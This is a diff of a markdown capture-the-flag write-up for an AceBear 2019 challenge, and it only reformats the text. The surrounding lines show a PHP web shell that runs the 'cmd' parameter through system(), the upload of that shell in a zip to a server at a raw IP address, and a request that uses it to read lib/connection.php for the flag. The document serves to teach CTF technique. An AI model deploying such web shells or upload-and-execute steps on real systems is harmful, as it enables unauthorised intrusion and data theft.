@@ -226,16 +226,18 @@ if(isset($_GET['cmd'])){ echo "<pre>"; $cmd = ($_GET['cmd']); system($cmd); echo
 ```
 * zip those two files [evil.zip](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/evil.zip) && upload it to server<br>
 ![upload1](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/upload1.png)
-> It Provided a path uploads/a3d7ebbe913126890938bdfe90833490/<br>
-> Access them on http://54.169.92.223/uploads/a3d7ebbe913126890938bdfe90833490/ <br>
+* It Provided a path uploads/a3d7ebbe913126890938bdfe90833490/<br>
+* Access them on http://54.169.92.223/uploads/a3d7ebbe913126890938bdfe90833490/ <br>
 ![upload2](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/upload2.png)
-> Now there is our cmd.php ; use it to RCE<br>
+* Now there is our cmd.php ; use it to RCE<br>
 ![cmd](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/cmd.png)
-> OUR backdoor is working ;<br>
-> By the Given source code we can know that flag is at [lib/connection.php](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/backup/lib/connection.php) <br>
-> path is `../../lib/connection.php`<br>
-> exploit is `view-source:http://54.169.92.223/uploads/a3d7ebbe913126890938bdfe90833490/cmd.php?cmd=cat%20../../lib/connection.php`
-> viewing source is important as the browser try's to parse the php ,So it Didn't display the php file properly<br>
+```
+ OUR backdoor is working :)
+ By the Given source code we can know that flag is at [lib/connection.php](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/backup/lib/connection.php) 
+ path is `../../lib/connection.php`
+ exploit is `view-source:http://54.169.92.223/uploads/a3d7ebbe913126890938bdfe90833490/cmd.php?cmd=cat%20../../lib/connection.php`
+ viewing source is important as the browser try's to parse the php ,So it Didn't display the php file properly
+```
 ![flag](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/flag.png)
 
 ```
